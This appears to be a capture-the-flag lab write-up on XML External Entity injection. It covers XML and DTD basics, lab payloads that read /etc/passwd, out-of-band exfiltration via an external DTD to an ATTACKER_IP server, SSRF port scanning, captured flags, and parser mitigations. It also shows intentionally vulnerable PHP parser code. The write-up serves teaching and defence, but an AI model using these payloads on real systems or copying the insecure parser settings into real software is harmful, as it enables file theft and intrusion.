# Introduction
---

**XXEÂ (XMLÂ External Entity) injection**Â is a type of security flaw that exploits vulnerabilities in an application'sÂ XMLÂ input. It occurs when an application acceptsÂ XMLÂ input that includes external entity references within theÂ XMLÂ itself. Attackers can leverage this vulnerability to disclose local files, make server-side requests, or execute remote code.

Given the widespread use ofÂ XMLÂ in web applications, particularly in web services andÂ SOAP-based APIs, the severity of these vulnerabilities cannot be underestimated.

### Objectives

1. Recognize the fundamental concepts and dangers associated withÂ XXEÂ injection.
2. Identify vulnerableÂ XMLÂ processing configurations and practices.
3. Develop techniques for detecting, exploiting, and mitigatingÂ XXEÂ vulnerabilities in applications.

### Prerequisites

1. Knowledge of howÂ XMLÂ documents are structured, including tags, attributes, and entity references.
2. Familiarity with how web applications process input and manage data.
3. Basic knowledge ofÂ OWASPÂ ZAPÂ orÂ Burp Suite.


# Exploring XML
---
### What isÂ XML?

XMLÂ (Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on.Â XMLÂ is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable. It's a flexible and widely used format for exchanging data between different systems and applications.Â XMLÂ consists of elements, attributes, and character data, which are used to represent data in a structured and organized way.

### XMLÂ Syntax and Structure

XMLÂ elements are represented by tags, which are surrounded by angle brackets (<>). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

The tagÂ `<name>John</name>`Â represents an element named "name" with the content "John". Attributes provide additional information about elements and are specified within the opening tag. The tagÂ `<user id="1">`Â specifies an attribute "id" with the value "1" for the element "user". Character data refers to the content within elements, such as "John".

The example above shows a simpleÂ XMLÂ document with elements, attributes, and character data. The tagÂ `<?xml version="1.0" encoding="UTF-8"?>`Â declaration indicates theÂ XMLÂ version, and the element contains various sub-elements and attributes representing user data.

### Common Use Cases in Web Applications

XMLÂ is widely used in web applications for data exchange, storage, and configuration. It's often used for web services and APIs, such asÂ SOAPÂ andÂ REST, to exchange data between systems.Â XMLÂ is also used for configuration files, such as web server configurations or application settings.

### What is XSLT?

XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and formatÂ XMLÂ documents. While XSLT is primarily used for data transformation and formatting, it is also significantly relevant toÂ XXEÂ (XMLÂ External Entities) attacks.

XSLT can be used to facilitateÂ XXEÂ attacks in several ways:  

1. **Data Extraction**: XSLT can be used to extract sensitive data from anÂ XMLÂ document, which can then be used in anÂ XXEÂ attack. For example, an XSLT stylesheet can extract user credentials or other sensitive information from anÂ XMLÂ file.
2. **Entity Expansion**: XSLT can expand entities defined in anÂ XMLÂ document, including external entities. This can allow an attacker to inject malicious entities, leading to anÂ XXEÂ vulnerability.
3. **Data Manipulation**: XSLT can manipulate data in anÂ XMLÂ document, potentially allowing an attacker to inject malicious data or modify existing data to exploit anÂ XXEÂ vulnerability.
4. **BlindÂ XXE**: XSLT can be used to perform blindÂ XXEÂ attacks, in which an attacker injects malicious entities without seeing the server's response.  
5. 
### What are DTDs?

DTDs or Document Type Definitions define the structure and constraints of anÂ XMLÂ document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within theÂ XMLÂ document or external in a separate file.

Purpose and usage of DTDs:

- **Validation**: DTDs validate the structure ofÂ XMLÂ to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
- **Entity Declaration**: DTDs define entities that can be used throughout theÂ XMLÂ document, including external entities which are key inÂ XXEÂ attacks.  
    
Internal DTDs are specified using theÂ `<!DOCTYPE`Â declaration, while external DTDs are referenced using the SYSTEM keyword.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

The example above shows an internal DTD defining the structure of a configuration file. The `Â <!ELEMENT` Â declarations specify the allowed elements and their relationships.

### DTDs andÂ XXE

DTDs play a crucial role inÂ XXEÂ injection, as they can be used to declare external entities. External entities can reference external files or URLs, which can lead to malicious data or code injection.

### XMLÂ Entities

XMLÂ entities are placeholders for data or code that can be expanded within anÂ XMLÂ document. There are five types of entities: internal entities, external entities, parameter entities, general entities, and character entities.

Example external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

This shows an external entity referencing a URL. TheÂ `&external;`Â reference within theÂ XMLÂ document will be expanded to the contents of the referenced URL.

### Types of Entities

1. Internal Entities are essentially variables used within anÂ XMLÂ document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY inf "This is a test.">
    ]>
    <note>
            <info>&inf;</info>
    </note>
    ```
    
    In this example, theÂ `&inf;`Â entity is replaced by its value wherever it appears in the document.
    
2. External Entities are similar to internal entities, but their contents are referenced from outside theÂ XMLÂ document, such as from a separate file or URL. This feature can be exploited inÂ XXEÂ (XMLÂ External Entity) attacks if theÂ XMLÂ processor is configured to resolve external entities. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```
    
    Here,Â `&ext;`Â pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.
    
3. Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scaleÂ XMLÂ applications. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```
    
    In this case,Â `%common;`Â is used within the DTD to define the type of data that theÂ `name`Â element should contain.
    
4. General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of theÂ XMLÂ document. Unlike parameter entities, general entities are intended for use in the document content. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```
    
    The entityÂ `&author;`Â is a general entity used to substitute the author's name wherever it's referenced in the document.
    
5. Character Entities are used to represent special or reserved characters that cannot be used directly inÂ XMLÂ documents. These entities prevent the parser from misinterpretingÂ XMLÂ syntax. For example:
    
    - `&lt;`Â for the less-than symbol (`<`)
    - `&gt;`Â for the greater-than symbol (`>`)
    - `&amp;`Â for the ampersand (`&`)
    
    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```
    
    This usage ensures that the special characters are processed correctly by theÂ XMLÂ parser without breaking the document's structure

The image below shows the type of entities in a DOM structure:

![Types of entities in DOM structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716545852309)



# XML Parsing Mechanisms
---

### XMLÂ Parsing

XMLÂ parsing is the process by which anÂ XMLÂ file is read, and its information is accessed and manipulated by a software program.Â XMLÂ parsers convert data fromÂ XMLÂ format into a structure that a program can use (like a DOM tree). During this process, parsers may validateÂ XMLÂ data against a schema or a DTD, ensuring the structure conforms to certain rules.

If a parser is configured to process external entities, it can lead to unauthorized access to files, internal systems, or external websites.

### CommonÂ XMLÂ Parsers

SeveralÂ XMLÂ parsers are used across different programming environments; each parser may handleÂ XMLÂ data differently, which can affect vulnerability toÂ XXEÂ injection.

- **DOM (Document Object Model) Parser**: This method builds the entireÂ XMLÂ document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
- **SAX (SimpleÂ APIÂ forÂ XML) Parser**: ParsesÂ XMLÂ data sequentially without loading the whole document into memory, making it suitable for largeÂ XMLÂ files. However, it is less flexible for accessingÂ XMLÂ data randomly.
- **StAX (StreamingÂ APIÂ forÂ XML) Parser**: Similar to SAX, StAX parsesÂ XMLÂ documents in a streaming fashion but gives the programmer more control over theÂ XMLÂ parsing process.
- **XPath Parser**: Parses anÂ XMLÂ document based on expression and is used extensively in conjunction with XSLT.


# Exploiting XXE - In-Band
---

### In-Band vs Out-of-BandÂ XXE

In-bandÂ XXEÂ refers to anÂ XXEÂ vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a maliciousÂ XMLÂ payload to the application, and the server will respond with the extracted data or the result of the attack.

Out-of-bandÂ XXE, on the other hand, refers to anÂ XXEÂ vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such asÂ DNSÂ orÂ HTTPÂ requests, to exfiltrate data. To extract the data, the attacker must craft a maliciousÂ XMLÂ payload that will trigger an out-of-band request, such as aÂ DNSÂ query or anÂ HTTPÂ request.

### In-BandÂ XXEÂ Exploitation

We will be usingÂ [Burp](https://tryhackme.com/module/learn-burp-suite)Â for this room. To demonstrate this vulnerability, go toÂ [http://10.10.87.195/contact.php](http://10.10.87.195/contact.php), and fill outÂ the form.

![Homepage of the application](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/db8f3f703dd6b8641d5555ed6ead1b49.png)  

Click the submit button and intercept the request.

![Intercepted request of the contact form](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/734c868f5e54ae3b3d0c3539301f2256.png)  

The submitted data is processed by contact_submit.php, which contains a vulnerableÂ PHPÂ code designed to return the value of the name parameter when a user submits a message in the form. Below is the vulnerable code:

```php
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

Since the application returns the value of the name parameter, we can inject an entity that is pointing toÂ `/etc/passwd`Â to disclose its values.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Using the payload above, replace the initialÂ XMLÂ data submitted to contact_submit.phpÂ and resend the request.

![Injected xxe payload pointed to /etc/passwd file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2f5c2d1f8e4c04b03daa1240463e7580.png)  

### XMLÂ Entity Expansion

XMLÂ Entity Expansion is a technique often used inÂ XXEÂ attacks that involves defining entities within anÂ XMLÂ document, which theÂ XMLÂ parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-bandÂ XXE, as it allows attackers to inject malicious entities into theÂ XMLÂ data. For example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

In the payload above,Â `&xxe;`Â is expanded wherever it appears. Attackers can use entity expansion to perform a Billion Laughs attack, where a smallÂ XMLÂ document recursively expands to consume server resources, leading to a denial of service.

![XML Expansion in action](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3e45b26afe9371b2061afbdba33ea3ce.png)

### Practical
---

We need to go to:

```
http://10.10.87.195/contact.php
```

We will see the following contact form:

![Pasted image 20250505171322.png](../../../IMAGES/Pasted%20image%2020250505171322.png)

Let's send some data and submit it to our proxy:

![Pasted image 20250505171411.png](../../../IMAGES/Pasted%20image%2020250505171411.png)

As seen, our `name` gets injected on here, we can build a `xxe` payload to read `/etc/passwd`:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

![Pasted image 20250505171514.png](../../../IMAGES/Pasted%20image%2020250505171514.png)

As seen `XXE` works, let's read the exercise file:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

![Pasted image 20250505171600.png](../../../IMAGES/Pasted%20image%2020250505171600.png)

We got our flag:

```
THM{1N_b4Nd_1$_34sYY}
```

# Exploiting XXE - Out-of-Band
---

### Out-Of-BandÂ XXE

On the other hand, to demonstrate this vulnerability, go toÂ [http://10.10.87.195/index.php](http://10.10.87.195/index.php). The application uses the below code when a user uploads a file:

```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

The code above doesn't return the values of the submittedÂ XMLÂ data. Hence, the term Out-of-Band since the exfiltrated data has to be captured using an attacker-controlled server.

For this attack, we will need a server that will receive data from other servers. You can use Python'sÂ http.server module, although there are options out there, likeÂ ApacheÂ or Nginx. Using AttackBox or your own machine, start a Python web server by using the command:

Starting a Python Webserver

```shell-session
user@tryhack $ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Upload a file in the application and monitor the request that is sent toÂ `submit.php`Â using your Burp. Forward the request below to Burp Repeater.

![Forward the request to repeater](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0ac465ae50933198b249c9e622cb8d9d.png)  

Using the payload below, replace the value of theÂ XMLÂ file in the request and resend it. Note that you have to replace the ATTACKER_IP variable with your own IP.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

Send the modifiedÂ HTTPÂ request.

![Modified HTTP request with the payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/08cbba233f61b8bc17e166c089931bd6.png)  

After sending the modifiedÂ HTTPÂ request, the Python web server will receive a connection from the target machine. The establishment of a connection with the server indicates that sensitive information can be extracted from the application.

![Python webserver receives a connection](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8cfa02d850cc73372dd6993acd9265fd.png)  

We can now create a DTD file that contains an external entity with aÂ PHPÂ filter to exfiltrate data from the target web application.

Save the sample DTD file below and name it asÂ `sample.dtd`. The payload below will exfiltrate the contents ofÂ `/etc/passwd`Â and send the response back to the attacker-controlled server:

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

**DTD Payload Explained**

The DTD begins with a declaration of an entityÂ `%cmd`Â that points to a system resource. TheÂ **`%cmd`**Â entity refers to a resource within the PHP filter protocolÂ `php://filter/convert.base64-encode/resource=/etc/passwd`. It retrieves the content ofÂ `/etc/passwd`, a standard file in Unix-based systems containing user account information. TheÂ `convert.base64-encode`Â filter encodes the content in Base64 format to avoid formatting problems. TheÂ **`%oobxxe`**Â entity contains another XML entity declaration,Â `exfil`, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data withÂ `%cmd`, representing the Base64-encoded content ofÂ `/etc/passwd`.Â WhenÂ `%oobxxe;`Â is parsed, it creates theÂ `exfil`Â entity that connects to an attacker's server (`http://ATTACKER_IP:1337/`). The parameterÂ `?data=%cmd`Â sends the Base64-encoded content fromÂ `%cmd`.

Go back to the repeater and change your payload to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

![Change the payload to the updated external DTD file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2e5178fb66945cbbb4e855d013690c9c.png)  

Resend the request and check your terminal. You will receive two (2) requests. The first is the request for the sample.dtd file, and the second is the request sent by the vulnerable application containing the encoded /etc/passwd.

![Two external connections received in the webserver with the exfiltrated data](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9c87f37b1fed79110958f8cdfc492c93.png)

Decoding the exfiltrated base64 data will show that it contains the base64 value of /etc/passwd.

![Decoded version of the exfiltrated data](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/4ea510718c602ecaa7de8357599e8ab3.png)

### Practical
---

Let's visit:

```
http://10.10.87.195/index.php
```

![Pasted image 20250505171743.png](../../../IMAGES/Pasted%20image%2020250505171743.png)

We can upload files on here, let's send a simple file and submit the request to our proxy:

![Pasted image 20250505171957.png](../../../IMAGES/Pasted%20image%2020250505171957.png)

Once we've uploaded the file, a new request to `/submit.php` will appear, as seen, we got an `XML` format on here, let's submit this to the repeater:

![Pasted image 20250505172052.png](../../../IMAGES/Pasted%20image%2020250505172052.png)

If we change the contents of the `XML` to this:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://10.11.136.34:8000/" >]>
<upload><file>&xxe;</file></upload>
```

If we send the request and check our python server:

```python
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.87.195 - - [05/May/2025 22:21:08] "GET / HTTP/1.0" 200 -
```

As seen, a `GET` request is being made to our server, this means, we can get the contents of files through encoding them in `base64`, let's first create a file named `test.dtd` with the following contents:

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://10.11.136.34:8000/?data=%cmd;'>">
%oobxxe;
```

Now, we can submit the following payload in our repeater:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://10.11.136.34:8000/test.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

If we check our python server, this happens:

```python
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.87.195 - - [05/May/2025 22:25:12] "GET /test.dtd HTTP/1.0" 200 -
10.10.87.195 - - [05/May/2025 22:25:12] "GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDk6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpsYW5kc2NhcGU6eDoxMTA6MTE1OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTExOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKZWMyLWluc3RhbmNlLWNvbm5lY3Q6eDoxMTI6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KdWJ1bnR1Ong6MTAwMDoxMDAwOlVidW50dTovaG9tZS91YnVudHU6L2Jpbi9iYXNoCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnRyeWhhY2ttZTp4OjEwMDE6MTAwMTosLCw6L2hvbWUvdHJ5aGFja21lOi9iaW4vYmFzaApteXNxbDp4OjExMzoxMTk6TXlTUUwgU2VydmVyLCwsOi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0" 200 -
```

We can decode those contents:

![Pasted image 20250505172708.png](../../../IMAGES/Pasted%20image%2020250505172708.png)

As seen, we get the contents of `/etc/passwd`.


# SSRF + XXE
---

**Server-Side Request Forgery (SSRF)**Â attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location. In the context ofÂ XXE, an attacker can manipulateÂ XMLÂ input to make the server issue requests to internal services or access internal files. This technique can be used to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the serverâ€™s local network.

### Internal Network Scanning

Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit anÂ XXEÂ vulnerability that makes the server send a request to its own internal network resource.

For example, using the captured request from the in-bandÂ XXEÂ task, send the captured request to Burp Intruder and use the payload below:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:Â§10Â§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

The external entity is set to fetch data fromÂ `http://localhost:Â§10Â§/`. Intruder will then reiterate the request and search for an internal service running on the server.

**Steps to brute force for open ports:**

1. Once the captured request from the In-Band XXE is in Intruder, click the AddÂ `Â§`Â button while highlighting the port.

![HTTP request in intruder](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/593a4fc9649f7eb2fec803104b3a897b.png)  

2. In the Payloads tab, set the payload type to Numbers with the Payload settings from 1 to 65535.

![Payloads tab with the right settings](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/e5358d3d6bde1dda471a34d9e207598e.png)

3. Once done, click the Start attack button and click the Length column to sort which item has the largest size. The difference in the server's response size is worth further investigation since it might contain information that is different compared to the other intruder requests.

![Successful attack showing the data](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6f184ed4700daf4859c6d4314a0205f5.png)  

![Flag in the response](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/634833be32484b2bfeb5761d3de57611.png)  

**How the Server Processes This**:

The entityÂ `&xxe;`Â is referenced within theÂ `<name>`Â tag, triggering the server to make anÂ HTTPÂ request to the specified URL when theÂ XMLÂ is parsed. The response of the requested resource will then be included in the server response. If an application contains secret keys,Â APIÂ keys, or hardcoded passwords, this information can then be used in another form of attack, such as password reuse.

### Potential Security Implications

- **Reconnaissance**: Attackers can discover services running on internal network ports and gain insights into the server's internal architecture.
- **Data Leakage**: If the internal service returns sensitive information, it could be exposed externally through errors orÂ XMLÂ data output.
- **Elevation of Privilege**: Accessing internal services could lead to further exploits, potentially escalating an attacker's capabilities within the network.


### Practical
---

Let's visit:

```
http://10.10.87.195/contact.php
```

Let's send a request and save it, now, let's send that request to automate or intruder in burp, we need to change the data to this:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```


It will look like this:

![Pasted image 20250505173243.png](../../../IMAGES/Pasted%20image%2020250505173243.png)


Now, we can set the parameter to the port and do the following:

![Pasted image 20250505173347.png](../../../IMAGES/Pasted%20image%2020250505173347.png)

Now, let's send the attack:

![Pasted image 20250505173514.png](../../../IMAGES/Pasted%20image%2020250505173514.png)

We got a lot of requests, if we are using caido, we can use the following `HTTTPQL` query:

```
resp.raw.cont:"Flag"
```

![Pasted image 20250505173709.png](../../../IMAGES/Pasted%20image%2020250505173709.png)

As seen, we got the flag:

```
THM{0O8_xx3!!}
```

# Mitigation
---

### Avoiding Misconfigurations

Misconfigurations inÂ XMLÂ parser settings are a common cause ofÂ XXE-related vulnerabilities. Adjusting these settings can significantly reduce the risk ofÂ XXEÂ attacks. Below are detailed guidelines and best practices for several popular programming languages and frameworks.

### General Best Practices

1. **Disable External Entities and DTDs**: As a best practice, disable the processing of external entities and DTDs in yourÂ XMLÂ parsers. MostÂ XXEÂ vulnerabilities arise from malicious DTDs.
2. **Use Less Complex Data Formats**: Where possible, consider using simpler data formats likeÂ JSON, which do not allow the specification of external entities.
3. **Allowlisting Input Validation**: Validate all incoming data against a strict schema that defines expected data types and patterns.Â Exclude or escapeÂ XML-specific characters such as <, >, &, ', and ". These characters are crucial inÂ XMLÂ syntax and can lead to injection attacks if misused.

### Mitigation Techniques in Popular Languages

**Java**

Use theÂ `DocumentBuilderFactory`Â and disable DTDs:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.NET**

ConfigureÂ XMLÂ readers to ignore DTDs and external entities:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP**

Disable loading external entities by libxml:

```php
libxml_disable_entity_loader(true);
```

**Python**

UseÂ `defusedxml`Â library, which is designed to mitigateÂ XMLÂ vulnerabilities:

```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

### Regularly Update and Patch

- **Software Updates**: Keep allÂ XMLÂ processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.
- **Security Patches**: Regularly apply security patches to web applications and their environments.

### Security Awareness and Code Reviews

- **Conduct Code Reviews**: Regularly review code for security vulnerabilities, especially code that handlesÂ XMLÂ input and parsing.
- **Promote Security Training**: Ensure developers are aware of secure coding practices, including the risks associated withÂ XMLÂ parsing.

# Conclusion
---

